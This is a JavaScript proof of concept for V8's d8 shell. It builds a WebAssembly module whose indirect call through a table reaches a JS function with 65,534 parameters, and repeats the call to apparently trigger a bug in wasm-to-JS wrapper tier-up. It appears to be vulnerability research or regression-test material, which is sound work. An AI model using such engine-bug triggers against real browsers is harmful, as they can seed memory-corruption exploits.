d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// PoC based on test/mjsunit/wasm/wasm-to-js-tierup.js

let jsFunc = eval("(" + Array(0xfffe).fill(0).map((_, i) => 'p'+i) + ")=>{}");
let numParams = 0x10;

const paramsTypes = new Array(numParams).fill(kWasmI32);
const retTypes = [];
const sig = makeSig(paramsTypes, retTypes);

const builder = new WasmModuleBuilder();
const sigId = builder.addType(sig);
const impIndex = builder.addImportedTable('m', 'table', 10, 10, kWasmAnyFunc);

let body = [];
for (let i = 0; i < numParams; ++i) {
  body.push(kExprLocalGet, i);
}

body.push(kExprI32Const, 0, kExprCallIndirect, sigId, impIndex);

builder.addFunction('main', sigId)
.addBody(body)
.exportFunc();

let table;
{
  const table_module_builder = new WasmModuleBuilder();
  const sigId = table_module_builder.addType(sig);
  const impIndex = table_module_builder.addImport('m', 'foo', sigId);

  const tableId =
    table_module_builder.addTable(kWasmAnyFunc, 10, 10).exportAs('table').index;
  table_module_builder.addActiveElementSegment(
    tableId, wasmI32Const(0), [impIndex]);

  table =
    table_module_builder.instantiate({'m': {'foo': jsFunc}}).exports.table;
}

const instance = builder.instantiate({ 'm': { 'table': table } });
for (let i = 0; i < 1000; i++) {
  instance.exports.main();
}
